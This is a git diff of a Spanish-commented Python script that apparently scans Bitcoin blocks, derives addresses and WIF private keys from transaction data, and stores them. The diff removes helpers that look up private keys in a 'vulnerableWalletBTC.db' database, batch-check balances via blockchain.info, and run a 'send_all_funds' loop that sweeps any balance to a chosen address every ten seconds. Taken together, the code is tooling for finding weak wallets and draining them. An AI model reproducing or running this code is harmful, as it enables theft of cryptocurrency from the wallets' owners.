@@ -2,7 +2,6 @@ import os
 import hashlib
 import requests
 import json
-import sqlite3
 from requests.auth import HTTPBasicAuth
 
 import time
@@ -48,51 +47,6 @@ def guardar_datos_masivo(direcciones_wif):
         except Exception as e:
             print(f"Error al insertar documentos: {e}")
 
-
-
-# Función para obtener todas las addresses
-def obtener_todas_las_addresses():
-    # Conectar a la base de datos local
-    conn = sqlite3.connect('datos.db')
-    cursor = conn.cursor()
-    
-    # Obtener todas las addresses de la tabla
-    cursor.execute('''
-    SELECT address FROM datos
-    ''')
-    resultados = cursor.fetchall()
-    
-    # Cerrar la conexión
-    conn.close()
-    
-    # Convertir el resultado en un array de addresses
-    addresses = [resultado[0] for resultado in resultados]
-    return addresses
-
-
-# Función para buscar el wif por address
-def buscar_wif_por_address(address):
-    # Conectar a la base de datos local
-    conn = sqlite3.connect('vulnerableWalletBTC.db')
-    cursor = conn.cursor()
-    
-    # Buscar el wif correspondiente al address
-    cursor.execute('''
-    SELECT wif FROM datos WHERE address = ?
-    ''', (address,))
-    resultado = cursor.fetchone()
-    
-    # Cerrar la conexión
-    conn.close()
-    
-    # Retornar el wif si se encuentra, de lo contrario, retornar None
-    return resultado[0] if resultado else None
-
-
-
-def guardar_texto_en_archivo(texto, nombre_archivo):
-    with open(nombre_archivo, 'a') as archivo:
-        archivo.write(texto + '\n')
 
 
 # Obtener Numero del Bloque
@@ -195,89 +149,6 @@ def get_transaction_addresses(txid=None):
         return []
 
 
-# Función para enviar todos los fondos
-def send_all_funds(privateKeyWIF, destination_address):
-    # Crear una clave a partir de la clave privada en formato WIF
-    key = Key(privateKeyWIF)
-
-    while True:
-
-        # Verificar el saldo disponible
-        balance = key.get_balance('btc')
-        print(f"Saldo disponible: {balance} BTC")
-        
-        try:
-            # Asegurarse de que balance es un número flotante
-            balance = float(balance)
-        except ValueError:
-            print("Error: El saldo no es un número válido.")
-            return
-
-
-        if balance <= 0:
-            print("No hay fondos disponibles para enviar")
-            break  # Sale del bucle while si se cumple la condición
-
-
-        try:
-            # Crear la transacción con la tarifa configurada
-            tx = key.create_transaction([], leftover=destination_address, replace_by_fee=False, absolute_fee=True)
-
-            # Verificar que la transacción fue exitosa
-            if tx:
-                print(f"Transacción creada con éxito: {tx}")
-            else:
-                print("No se pudo crear la transacción, sin detalles de la respuesta.")
-
-        except Exception as e:
-            print(f"Error al crear la transacción: {str(e)}")
-
-
-        # Esperar 10 segundos antes de intentar nuevamente hasta que quede en 0 BTC
-        time.sleep(10)
-
-
-
-# Función para obtener el balance de una dirección usando la API de Blockchain.info
-def obtener_balance_direccion(direcciones):
-    """
-    Obtiene el balance de varias direcciones usando la API de Blockchain.info.
-    Las direcciones se pasan en lotes de 140 debido a las limitaciones de la API.
-
-    :param direcciones: Lista de direcciones Bitcoin.
-    :return: Diccionario con los balances de las direcciones.
-    """
-    # Asegúrate de que 'direcciones' es una lista
-    if isinstance(direcciones, str):
-        direcciones = direcciones.split(',')  # Convertir cadena separada por comas en lista
-
-
-    # Agrupar direcciones en bloques de 140 para evitar superar los límites de la API
-    balances = {}
-    for i in range(0, len(direcciones), 140):
-        batch = direcciones[i:i+140]
-
-        # Unir las direcciones con '|' para la URL
-        direcciones_unidas = '|'.join(batch)
-        
-        url = f"https://blockchain.info/balance?active={direcciones_unidas}"
-        response = requests.get(url)
-        
-        if response.status_code == 200:
-            data = response.json()
-
-            balances.update(data)
-        else:
-            print(f"Error al obtener el balance para las direcciones: {direcciones_unidas}")
-            print(f"Respuesta de la API: {response.text}")
-        
-
-        # Esperar 5 segundos antes de procesar el siguiente lote
-        time.sleep(5)
-    
-    return balances
-
-
 
 # Función para generar direcciones y WIF
 def generar_direcciones_y_wif(texto=None, isAddress=False):
@@ -371,6 +242,7 @@ def procesar_bloque_y_transacciones(bloque_id):
             if resultadoTxToAddress['direccion_comprimida'].startswith('1'):
                 direcciones_wif[resultadoTxToAddress['direccion_comprimida']] = resultadoTxToAddress['wif_comprimida']
 
+
     # Obtenemos las direcciones de las transacciones y les asignamos los WIFs
     for i, tx_hash in enumerate(tx_hashes):
         # Mostrar el número de transacciones restantes por procesar
@@ -399,6 +271,7 @@ def procesar_bloque_y_transacciones(bloque_id):
 
 # Obtener el número del último bloque
 latest_block_number = None
+
 
 def contador_infinito(inicio, archivo="avanceBlock_mongodb.txt"):
     # Verifica si el archivo existe
